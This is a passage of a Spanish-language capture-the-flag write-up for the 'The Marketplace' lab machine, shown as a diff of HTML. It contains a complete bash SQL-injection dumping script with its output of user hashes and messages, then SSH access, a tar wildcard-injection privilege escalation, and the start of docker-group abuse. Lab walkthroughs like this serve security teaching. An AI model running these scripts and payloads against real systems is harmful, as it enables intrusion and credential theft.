+	</span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 <span class="nv">$number_output</span><span class="si">)</span><span class="p">;</span> <span class="k">do
+		</span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">[</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">greenColor</span><span class="k">}</span><span class="s2">+</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">] Table [</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">greenColor</span><span class="k">}</span><span class="nv">$i</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">]:</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> "</span>
+		curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Cookie: token=</span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-X</span> GET <span class="s2">"</span><span class="nv">$url</span><span class="s2">/admin?user=-1+union+select+null,table_name,null,null+from+information_schema.tables+limit+</span><span class="nv">$i</span><span class="s2">,1+--+-"</span> | <span class="nb">grep</span> <span class="s2">"User"</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1 | <span class="nb">awk</span> <span class="s1">'{print $2}'</span>
+	<span class="k">done</span><span class="p">;</span> tput cnorm
+<span class="o">}</span>
+
+<span class="k">function </span>extractColumns<span class="o">(){</span>
+	<span class="nb">echo
+	</span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 <span class="nv">$number_output</span><span class="si">)</span><span class="p">;</span> <span class="k">do
+		</span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">[</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">greenColor</span><span class="k">}</span><span class="s2">+</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">] Column [</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">greenColor</span><span class="k">}</span><span class="nv">$i</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">]:</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> "</span>
+		curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Cookie: token=</span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-X</span> GET <span class="s2">"</span><span class="nv">$url</span><span class="s2">/admin?user=-1+union+select+null,column_name,null,null+from+information_schema.columns+where+table_name='</span><span class="nv">$table</span><span class="s2">'+limit+</span><span class="nv">$i</span><span class="s2">,1+--+-"</span> | <span class="nb">grep</span> <span class="s2">"User"</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1 | <span class="nb">awk</span> <span class="s1">'{print $2}'</span>
+	<span class="k">done</span><span class="p">;</span> tput cnorm
+<span class="o">}</span>
+
+<span class="k">function </span>extractFields<span class="o">(){</span>
+	<span class="nb">declare</span> <span class="nt">-r</span> <span class="nv">fields</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$fields</span> | <span class="nb">sed</span> <span class="s1">'s/,/,0x3a,/g'</span><span class="si">)</span>
+
+        <span class="nb">echo
+        </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 <span class="nv">$number_output</span><span class="si">)</span><span class="p">;</span> <span class="k">do
+                </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">[</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">greenColor</span><span class="k">}</span><span class="s2">+</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">] Field [</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">greenColor</span><span class="k">}</span><span class="nv">$i</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">]:</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+                curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Cookie: token=</span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-X</span> GET <span class="s2">"</span><span class="nv">$url</span><span class="s2">/admin?user=-1+union+select+concat(</span><span class="nv">$fields</span><span class="s2">),null,null,null+from+</span><span class="nv">$table</span><span class="s2">+limit+</span><span class="nv">$i</span><span class="s2">,1+--+-"</span> | <span class="nb">grep</span> <span class="s2">"ID"</span> <span class="nt">-A</span> 50 | <span class="nb">grep</span> <span class="s2">"Is administrator:"</span> <span class="nt">-B</span> 15 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Is administrator:"</span> | <span class="nb">sed</span> <span class="s2">"s/ID://"</span> | <span class="nb">sed</span> <span class="s2">"s/&lt;br /&gt;/g"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"&gt;/&gt;"</span> | <span class="nb">sed</span> <span class="s2">"s/           / /g"</span>
+        <span class="k">done</span><span class="p">;</span> tput cnorm
+<span class="o">}</span>
+
+<span class="nb">declare</span> <span class="nt">-i</span> <span class="nv">parameter_counter</span><span class="o">=</span>0<span class="p">;</span> <span class="k">while </span><span class="nb">getopts</span> <span class="s2">":c:e:t:f:n:h:"</span> arg<span class="p">;</span> <span class="k">do
+	case</span> <span class="nv">$arg</span> <span class="k">in
+		</span>c<span class="p">)</span> <span class="nv">token</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;</span> <span class="nb">let </span>parameter_counter+<span class="o">=</span>1<span class="p">;;</span>
+		e<span class="p">)</span> <span class="nv">extract</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;</span> <span class="nb">let </span>parameter_counter+<span class="o">=</span>1<span class="p">;;</span>
+		t<span class="p">)</span> <span class="nv">table</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;</span> <span class="nb">let </span>parameter_counter+<span class="o">=</span>1<span class="p">;;</span>
+		f<span class="p">)</span> <span class="nv">fields</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;</span> <span class="nb">let </span>parameter_counter+<span class="o">=</span>1<span class="p">;;</span>
+		n<span class="p">)</span> <span class="nv">number_output</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;</span> <span class="nb">let </span>parameter_counter+<span class="o">=</span>1<span class="p">;;</span>
+		h<span class="p">)</span> <span class="nb">help</span><span class="p">;;</span>
+	<span class="k">esac</span>
+<span class="k">done
+
+if</span> <span class="o">[</span> <span class="nv">$parameter_counter</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+	</span>helpPanel
+<span class="k">else
+	if</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$extract</span><span class="si">)</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"tables"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+		if</span> <span class="o">[</span> <span class="o">!</span> <span class="s2">"</span><span class="nv">$number_output</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+			</span><span class="nv">number_output</span><span class="o">=</span>100
+			extractTables <span class="nv">$number_output</span>
+		<span class="k">else
+			</span>extractTables <span class="nv">$number_output</span>
+		<span class="k">fi
+	elif</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$extract</span><span class="si">)</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"columns"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+		if</span> <span class="o">[</span> <span class="o">!</span> <span class="s2">"</span><span class="nv">$number_output</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+			</span><span class="nv">number_output</span><span class="o">=</span>50
+			extractColumns <span class="nv">$number_output</span>
+		<span class="k">else
+			</span>extractColumns <span class="nv">$number_output</span>
+		<span class="k">fi
+	elif</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$extract</span><span class="si">)</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"fields"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+		if</span> <span class="o">[</span> <span class="o">!</span> <span class="s2">"</span><span class="nv">$number_output</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+			</span><span class="nv">number_output</span><span class="o">=</span>30
+			extractFields <span class="nv">$number_output</span>
+		<span class="k">else
+			</span>extractFields <span class="nv">$number_output</span>
+		<span class="k">fi
+	fi
+fi</span>
+</code></pre></div></div>
+
+<p>Se ve de la siguiente manera:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./sqli.sh
+
+<span class="o">[!]</span> Use: ./sqli.sh
+<span class="nt">--------------------------------------------------------------------------------</span>
+
+        <span class="o">[</span><span class="nt">-c</span><span class="o">]</span> Cookie
+        <span class="o">[</span><span class="nt">-e</span><span class="o">]</span> Extract
+                tables
+                columns
+                        <span class="o">[</span><span class="nt">-t</span><span class="o">]</span> Table name
+                fields
+                        <span class="o">[</span><span class="nt">-f</span><span class="o">]</span> Fields names <span class="o">(</span>ceparate by ,<span class="o">)</span>
+        <span class="o">[</span><span class="nt">-n</span><span class="o">]</span> Number output
+        <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> Show this <span class="nb">help </span>panel
+
+        Use examples:
+                ./sqli.sh <span class="nt">-c</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO <span class="nt">-e</span> tables <span class="nt">-n</span> 80
+                ./sqli.sh <span class="nt">-c</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO <span class="nt">-e</span> columns <span class="nt">-t</span> Users <span class="nt">-n</span> 30
+                ./sqli.sh <span class="nt">-c</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO <span class="nt">-e</span> fields <span class="nt">-f</span> <span class="nb">id</span>,user,password <span class="nt">-t</span> Users <span class="nt">-n</span> 10
+</code></pre></div></div>
+
+<p>Lo primero que deberías hacer es cambiar la ip que está por defecto en el código del script por la IP que tengas asignada en tu máquina víctima</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">declare</span> <span class="nt">-r</span> <span class="nv">url</span><span class="o">=</span><span class="s2">"http://127.0.0.1"</span> <span class="c"># &lt;- CHANGE THIS</span>
+</code></pre></div></div>
+<p>Una vez hecho esto empezaremos a listar las tablas existentes en la base de datos usando nuestra herramienta de la siguiente manera:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./sqli.sh <span class="nt">-c</span> COOKIE_DEL_USUARIO_ADMINISTRADOR <span class="nt">-e</span> tables <span class="nt">-n</span> 80
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Table <span class="o">[</span>0]: ADMINISTRABLE_ROLE_AUTHORIZATIONS
+
+<span class="o">[</span>+] Table <span class="o">[</span>1]: APPLICABLE_ROLES					<span class="o">[</span>+] Table <span class="o">[</span>41]: INNODB_TABLESTATS
+
+<span class="o">[</span>+] Table <span class="o">[</span>2]: CHARACTER_SETS					<span class="o">[</span>+] Table <span class="o">[</span>42]: INNODB_TEMP_TABLE_INFO
+
+<span class="o">[</span>+] Table <span class="o">[</span>3]: CHECK_CONSTRAINTS				<span class="o">[</span>+] Table <span class="o">[</span>43]: INNODB_TRX
+
+<span class="o">[</span>+] Table <span class="o">[</span>4]: COLLATIONS					<span class="o">[</span>+] Table <span class="o">[</span>44]: INNODB_VIRTUAL
+
+<span class="o">[</span>+] Table <span class="o">[</span>5]: COLLATION_CHARACTER_SET_APPLICABILITY		<span class="o">[</span>+] Table <span class="o">[</span>45]: KEYWORDS
+
+<span class="o">[</span>+] Table <span class="o">[</span>6]: COLUMNS						<span class="o">[</span>+] Table <span class="o">[</span>46]: KEY_COLUMN_USAGE
+
+<span class="o">[</span>+] Table <span class="o">[</span>7]: COLUMNS_EXTENSIONS				<span class="o">[</span>+] Table <span class="o">[</span>47]: OPTIMIZER_TRACE
+
+<span class="o">[</span>+] Table <span class="o">[</span>8]: COLUMN_PRIVILEGES				<span class="o">[</span>+] Table <span class="o">[</span>48]: PARAMETERS
+
+<span class="o">[</span>+] Table <span class="o">[</span>9]: COLUMN_STATISTICS				<span class="o">[</span>+] Table <span class="o">[</span>49]: PARTITIONS
+
+<span class="o">[</span>+] Table <span class="o">[</span>10]: ENABLED_ROLES					<span class="o">[</span>+] Table <span class="o">[</span>50]: PLUGINS
+
+<span class="o">[</span>+] Table <span class="o">[</span>11]: ENGINES						<span class="o">[</span>+] Table <span class="o">[</span>51]: PROCESSLIST
+
+<span class="o">[</span>+] Table <span class="o">[</span>12]: EVENTS						<span class="o">[</span>+] Table <span class="o">[</span>52]: PROFILING
+
+<span class="o">[</span>+] Table <span class="o">[</span>13]: FILES						<span class="o">[</span>+] Table <span class="o">[</span>53]: REFERENTIAL_CONSTRAINTS
+
+<span class="o">[</span>+] Table <span class="o">[</span>14]: INNODB_BUFFER_PAGE				<span class="o">[</span>+] Table <span class="o">[</span>54]: RESOURCE_GROUPS
+
+<span class="o">[</span>+] Table <span class="o">[</span>15]: INNODB_BUFFER_PAGE_LRU				<span class="o">[</span>+] Table <span class="o">[</span>55]: ROLE_COLUMN_GRANTS
+
+<span class="o">[</span>+] Table <span class="o">[</span>16]: INNODB_BUFFER_POOL_STATS			<span class="o">[</span>+] Table <span class="o">[</span>56]: ROLE_ROUTINE_GRANTS
+
+<span class="o">[</span>+] Table <span class="o">[</span>17]: INNODB_CACHED_INDEXES				<span class="o">[</span>+] Table <span class="o">[</span>57]: ROLE_TABLE_GRANTS
+
+<span class="o">[</span>+] Table <span class="o">[</span>18]: INNODB_CMP					<span class="o">[</span>+] Table <span class="o">[</span>58]: ROUTINES
+
+<span class="o">[</span>+] Table <span class="o">[</span>19]: INNODB_CMPMEM					<span class="o">[</span>+] Table <span class="o">[</span>59]: SCHEMATA
+
+<span class="o">[</span>+] Table <span class="o">[</span>20]: INNODB_CMPMEM_RESET				<span class="o">[</span>+] Table <span class="o">[</span>60]: SCHEMA_PRIVILEGES
+
+<span class="o">[</span>+] Table <span class="o">[</span>21]: INNODB_CMP_PER_INDEX				<span class="o">[</span>+] Table <span class="o">[</span>61]: STATISTICS
+
+<span class="o">[</span>+] Table <span class="o">[</span>22]: INNODB_CMP_PER_INDEX_RESET			<span class="o">[</span>+] Table <span class="o">[</span>62]: ST_GEOMETRY_COLUMNS
+
+<span class="o">[</span>+] Table <span class="o">[</span>23]: INNODB_CMP_RESET				<span class="o">[</span>+] Table <span class="o">[</span>63]: ST_SPATIAL_REFERENCE_SYSTEMS
+
+<span class="o">[</span>+] Table <span class="o">[</span>24]: INNODB_COLUMNS					<span class="o">[</span>+] Table <span class="o">[</span>64]: ST_UNITS_OF_MEASURE
+
+<span class="o">[</span>+] Table <span class="o">[</span>25]: INNODB_DATAFILES				<span class="o">[</span>+] Table <span class="o">[</span>65]: TABLES
+
+<span class="o">[</span>+] Table <span class="o">[</span>26]: INNODB_FIELDS					<span class="o">[</span>+] Table <span class="o">[</span>66]: TABLESPACES
+
+<span class="o">[</span>+] Table <span class="o">[</span>27]: INNODB_FOREIGN					<span class="o">[</span>+] Table <span class="o">[</span>67]: TABLESPACES_EXTENSIONS
+
+<span class="o">[</span>+] Table <span class="o">[</span>28]: INNODB_FOREIGN_COLS				<span class="o">[</span>+] Table <span class="o">[</span>68]: TABLES_EXTENSIONS
+
+<span class="o">[</span>+] Table <span class="o">[</span>29]: INNODB_FT_BEING_DELETED				<span class="o">[</span>+] Table <span class="o">[</span>69]: TABLE_CONSTRAINTS
+
+<span class="o">[</span>+] Table <span class="o">[</span>30]: INNODB_FT_CONFIG				<span class="o">[</span>+] Table <span class="o">[</span>70]: TABLE_CONSTRAINTS_EXTENSIONS
+
+<span class="o">[</span>+] Table <span class="o">[</span>31]: INNODB_FT_DEFAULT_STOPWORD			<span class="o">[</span>+] Table <span class="o">[</span>71]: TABLE_PRIVILEGES
+
+<span class="o">[</span>+] Table <span class="o">[</span>32]: INNODB_FT_DELETED				<span class="o">[</span>+] Table <span class="o">[</span>72]: TRIGGERS
+
+<span class="o">[</span>+] Table <span class="o">[</span>33]: INNODB_FT_INDEX_CACHE				<span class="o">[</span>+] Table <span class="o">[</span>73]: USER_ATTRIBUTES
+
+<span class="o">[</span>+] Table <span class="o">[</span>34]: INNODB_FT_INDEX_TABLE				<span class="o">[</span>+] Table <span class="o">[</span>74]: USER_PRIVILEGES
+
+<span class="o">[</span>+] Table <span class="o">[</span>35]: INNODB_INDEXES					<span class="o">[</span>+] Table <span class="o">[</span>75]: VIEWS
+
+<span class="o">[</span>+] Table <span class="o">[</span>36]: INNODB_METRICS					<span class="o">[</span>+] Table <span class="o">[</span>76]: VIEW_ROUTINE_USAGE
+
+<span class="o">[</span>+] Table <span class="o">[</span>37]: INNODB_SESSION_TEMP_TABLESPACES			<span class="o">[</span>+] Table <span class="o">[</span>77]: VIEW_TABLE_USAGE
+
+<span class="o">[</span>+] Table <span class="o">[</span>38]: INNODB_TABLES					<span class="o">[</span>+] Table <span class="o">[</span>78]: items
+
+<span class="o">[</span>+] Table <span class="o">[</span>39]: INNODB_TABLESPACES				<span class="o">[</span>+] Table <span class="o">[</span>79]: messages
+
+<span class="o">[</span>+] Table <span class="o">[</span>40]: INNODB_TABLESPACES_BRIEF			<span class="o">[</span>+] Table <span class="o">[</span>80]: <span class="nb">users</span>
+</code></pre></div></div>
+<p>Luego de eso podemos ver que en total se nos listan 80 tablas, de las cuales me llaman la atención 2, users y messages, así que ahora continuaremos listando las columnas de la tabla users de la siguiente manera:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./sqli.sh <span class="nt">-c</span> COOKIE_DEL_USUARIO_ADMINISTRADOR <span class="nt">-e</span> columns <span class="nt">-t</span> <span class="nb">users</span> <span class="nt">-n</span> 3
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Column <span class="o">[</span>0]: <span class="nb">id</span>
+
+<span class="o">[</span>+] Column <span class="o">[</span>1]: username
+
+<span class="o">[</span>+] Column <span class="o">[</span>2]: password
+
+<span class="o">[</span>+] Column <span class="o">[</span>3]: isAdministrator
+</code></pre></div></div>
+<p>vemos que solo se nos listan 4 columnas (id, username, password, isAdministrator) Veamos la información de los campos que nos interese de las columnas anteriormente encontradas, en mi caso listaré el username y password tal que así:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./sqli.sh <span class="nt">-c</span> COOKIE_DEL_USUARIO_ADMINISTRADOR <span class="nt">-e</span> fields <span class="nt">-f</span> username,password <span class="nt">-t</span> <span class="nb">users</span> <span class="nt">-n</span> 3
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Field <span class="o">[</span>0]: system:<span class="nv">$2b$10$83pRYaRd4ZWJVEex</span>.lxu.Xs1aTNDBWIUmB4z.R0DT0MSGIGzsgW 
+
+<span class="o">[</span>+] Field <span class="o">[</span>1]: michael:<span class="nv">$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf1q</span> 
+
+<span class="o">[</span>+] Field <span class="o">[</span>2]: jake:<span class="nv">$2b$10$DkSlJB4L85SCNhS</span>.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG 
+
+<span class="o">[</span>+] Field <span class="o">[</span>3]: invertebrado:<span class="nv">$2b$10$vP</span>.vcNPPHhKVIQ.1vkjGM.4iFwZXksK5zVBBcUHe6upQoh7B.XW
+</code></pre></div></div>
+
+<p>Luego de esto podemos ver que en total hay 4 usuarios system,michael,jake,Invertebrado(el usuario que creamos al inicio) seguidos de unos hashes los cuales intenté crackear usando jhon con el diccionario rockyou, pero estaba tardando demasiado así que decidí cancelarlo y recordé que a demás de la tabla users había otra que se veía interesante (messages), entonces dumpee las columnas de esa tabla</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./sqli.sh <span class="nt">-c</span> COOKIE_DEL_USUARIO_ADMINISTRADOR <span class="nt">-e</span> columns <span class="nt">-t</span> messages <span class="nt">-n</span> 4
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Column <span class="o">[</span>0]: <span class="nb">id</span>
+
+<span class="o">[</span>+] Column <span class="o">[</span>1]: user_from
+
+<span class="o">[</span>+] Column <span class="o">[</span>2]: user_to
+
+<span class="o">[</span>+] Column <span class="o">[</span>3]: message_content
+
+<span class="o">[</span>+] Column <span class="o">[</span>4]: is_read
+</code></pre></div></div>
+
+<p>ahí vemos las columnas que contiene, ahora sigue extraer los campos de interes</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./sqli.sh <span class="nt">-c</span> COOKIE_DEL_USUARIO_ADMINISTRADOR <span class="nt">-e</span> fields <span class="nt">-f</span> user_from,user_to,message_content <span class="nt">-t</span> messages <span class="nt">-n</span> 2
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Field <span class="o">[</span>0]: 1:3:Hello!
+An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
+Your new password is: @&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>J 
+
+<span class="o">[</span>+] Field <span class="o">[</span>1]: 1:4:Thank you <span class="k">for </span>your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks <span class="k">for </span>using The Marketplace! 
+
+<span class="o">[</span>+] Field <span class="o">[</span>2]: 1:4:Thank you <span class="k">for </span>your report. We have reviewed the listing and found nothing that violates our rules.
+</code></pre></div></div>
+
+<p>Al hacer esto podemos ver que hay 4 mensajes de los cuales el único que nos interesa es el primero, aquí podemos ver una clave de ssh que el usuario 1 (system) le proporciona al usuario 3 (jake), el orden de los usuarios es el mismo que vimos cuando dumpeamos los usuarios con sus hashes</p>
+
+<p>Probamos a conectarnos por ssh como el usuario jake para validar que la calve es valida</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> ssh jake@[IP]
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The authenticity of host <span class="s1">'10.10.140.35 (10.10.140.35)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.140.35<span class="s1">' (ECDSA) to the list of known hosts.
+jake@10.10.140.35'</span>s password:
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-112-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Aug 17 23:08:12 UTC 2021
+
+  System load:  0.0                Users logged <span class="k">in</span>:                0
+  Usage of /:   87.1% of 14.70GB   IP address <span class="k">for </span>eth0:            10.10.140.35
+  Memory usage: 28%                IP address <span class="k">for </span>docker0:         172.17.0.1
+  Swap usage:   0%                 IP address <span class="k">for </span>br-636b40a4e2d6: 172.18.0.1
+  Processes:    96
+
+  <span class="o">=&gt;</span> / is using 87.1% of 14.70GB
+
+
+20 packages can be updated.
+0 updates are security updates.
+
+
+jake@the-marketplace:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y estamos dentro!, ahora puedes leer la flag user.txt en el directorio personal de michael Luego de esto listé los archivos que tubiesen permisos SUID, pero no encontré ninguno que fuese interesante</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@the-marketplace:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+THM<span class="o">{</span>&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;}</span>
+</code></pre></div></div>
+
+<p>Entonces viendo que podemos hacer como root siendo jake nos encontramos con algo que puede ser interesante</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@the-marketplace:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries <span class="k">for </span>jake on the-marketplace:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User jake may run the following commands on the-marketplace:
+    <span class="o">(</span>michael<span class="o">)</span> NOPASSWD: /opt/backups/backup.sh
+</code></pre></div></div>
+
+<p>podemos ejecutar un script, si leemos el código del script vemos un potencial vector de ataque, un wiledcard (*), así que se viene privileges scalation con wiledcard</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@the-marketplace:~<span class="nv">$ </span><span class="nb">cat</span> /opt/backups/backup.sh
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"Backing up files..."</span><span class="p">;</span>
+<span class="nb">tar </span>cf /opt/backups/backup.tar <span class="k">*</span>
+</code></pre></div></div>
+
+<p>En este script está usando tar diciendole que englobe todo lo disponible en el directorio actual con el wiledcard, así que nos aprobechamos de 2 parametros que tiene tar con los que se pueden ejecutar comandos para crear los siguientes archivos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@the-marketplace:/opt/backups~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>bash
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@the-marketplace:/opt/backups~<span class="nv">$ </span><span class="nb">ls
+</span>backup.sh   backup.tar  <span class="s1">'--checkpoint=1'</span>  <span class="s1">'--checkpoint-action=exec=bash'</span>
+</code></pre></div></div>
+
+<p>esto ará que tar tome los archivos como parametros del mismo y ejecute la instrucción que se le indique (en este caso exec=bash) luego de esto eliminamos el archivo backup.tar</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@the-marketplace:/opt/backups~<span class="nv">$ </span><span class="nb">rm </span>backup.tar
+</code></pre></div></div>
+
+<p>esto para evitar el siguiente error:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@the-marketplace:/opt/backups<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> michael ./backup.sh
+Backing up files...
+<span class="nb">tar</span>: /opt/backups/backup.tar: Cannot open: Permission denied
+<span class="nb">tar</span>: Error is not recoverable: exiting now
+</code></pre></div></div>
+
+<p>ejecutamos el script como el usuario michael</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jake@the-marketplace:/opt/backups<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> michael ./backup.sh
+Backing up files...
+</code></pre></div></div>
+
+<p>y ahora somos el usuario michael, excelente trabajo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>michael@the-marketplace:/opt/backups<span class="nv">$ </span><span class="nb">whoami
+</span>michael
+</code></pre></div></div>
+
+<p>Pero todavía falta conseguir la flag del usuario root, así que vamos a eso</p>
+
+<p>viendo en que grupos está michael vemos uno muy llamativo del que podemos abusar para convertirnos en root, el grupo docker, así que directamente listamos las imagenes que hay</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>michael@the-marketplace:/opt/backups<span class="nv">$ </span>docker images
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
+themarketplace_marketplace   latest              6e3d8ac63c27        11 months ago       2.16GB
+nginx                        latest              4bb46517cac3        12 months ago       133MB
+node                         lts-buster          9c4cc2688584        12 months ago       886MB
